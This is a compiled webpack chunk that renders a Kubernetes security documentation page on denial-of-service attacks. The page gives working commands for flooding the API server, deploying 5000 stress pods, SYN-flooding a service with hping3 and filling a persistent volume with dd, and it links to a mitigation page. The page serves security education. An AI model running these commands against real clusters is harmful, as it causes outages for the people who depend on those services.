"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[5761],{5930:(e,s,t)=>{t.r(s),t.d(s,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/ddos_attacks","title":"Denial of Service (DoS) Attacks","description":"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages.","source":"@site/docs/attack_vectors/ddos_attacks.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/ddos_attacks","permalink":"/docs/attack_vectors/ddos_attacks","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":9,"frontMatter":{"sidebar_position":9,"title":"Denial of Service (DoS) Attacks","description":"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."},"sidebar":"default","previous":{"title":"Container Escape","permalink":"/docs/attack_vectors/privileged_container_escape"},"next":{"title":"Unrestricted HostPath Mounts","permalink":"/docs/attack_vectors/unrestricted_hostpath_mounts"}}');var r=t(4848),a=t(8453);const i={sidebar_position:9,title:"Denial of Service (DoS) Attacks",description:"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."},o="Denial of Service (DoS) Attacks",c={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Flood the Kubernetes API Server",id:"1-flood-the-kubernetes-api-server",level:3},{value:"2. Deploy Resource-Exhausting Pods",id:"2-deploy-resource-exhausting-pods",level:3},{value:"3. Exploit Missing Network Policies",id:"3-exploit-missing-network-policies",level:3},{value:"4. Abuse Persistent Storage",id:"4-abuse-persistent-storage",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"denial-of-service-dos-attacks",children:"Denial of Service (DoS) Attacks"})}),"\n",(0,r.jsxs)(s.p,{children:["A ",(0,r.jsx)(s.strong,{children:"Denial of Service (DoS) attack"})," targets a Kubernetes cluster by exhausting system resources, overloading the API server, or overwhelming network capacity. These attacks can lead to service downtime, degraded performance, or total cluster unavailability."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,r.jsx)(s.h3,{id:"1-flood-the-kubernetes-api-server",children:"1. Flood the Kubernetes API Server"}),"\n",(0,r.jsx)(s.p,{children:"An attacker sends repeated API requests to overload the control plane:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"while true; do kubectl get pods --all-namespaces; done\n"})}),"\n",(0,r.jsx)(s.p,{children:"If unauthenticated or loosely authenticated access is permitted, the API server experiences high latency and dropped requests."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"2-deploy-resource-exhausting-pods",children:"2. Deploy Resource-Exhausting Pods"}),"\n",(0,r.jsx)(s.p,{children:"Without Pod resource limits, the attacker creates high-load containers to consume CPU and memory:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overload-pods\nspec:\n  replicas: 5000\n  template:\n    spec:\n      containers:\n        - name: stress-container\n          image: polinux/stress\n          command: ["stress"]\n          args:\n            [\n              "--cpu",\n              "4",\n              "--io",\n              "4",\n              "--vm",\n              "4",\n              "--vm-bytes",\n              "128M",\n              "--timeout",\n              "300s",\n            ]\n'})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f overload-pods.yaml\n"})}),"\n",(0,r.jsx)(s.p,{children:"This can starve other workloads and destabilize the cluster."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"3-exploit-missing-network-policies",children:"3. Exploit Missing Network Policies"}),"\n",(0,r.jsx)(s.p,{children:"If no Network Policies are enforced, an attacker can flood internal services:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"hping3 -S -p 443 <service-ip> --flood\n"})}),"\n",(0,r.jsx)(s.p,{children:"This overwhelms the service backend, resulting in dropped connections and timeout errors."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"4-abuse-persistent-storage",children:"4. Abuse Persistent Storage"}),"\n",(0,r.jsx)(s.p,{children:"If storage usage is not constrained, the attacker fills up a PersistentVolume:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"dd if=/dev/zero of=/mnt/persistent-volume/attack bs=1M count=100000\n"})}),"\n",(0,r.jsx)(s.p,{children:"Full disk usage disrupts stateful workloads relying on persistent storage."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,r.jsxs)(s.p,{children:["The attacker causes ",(0,r.jsx)(s.strong,{children:"resource exhaustion, service unavailability, latency spikes, and application crashes"}),". Without proper controls, even a low-privileged user can perform widespread denial of service."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,r.jsxs)(s.p,{children:["\u27a1 ",(0,r.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/ddos_mitigation",children:"Mitigating DoS Attacks in Kubernetes"})]})]})}function p(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,s,t)=>{t.d(s,{R:()=>i,x:()=>o});var n=t(6540);const r={},a=n.createContext(r);function i(e){const s=n.useContext(a);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),n.createElement(a.Provider,{value:s},e.children)}}}]);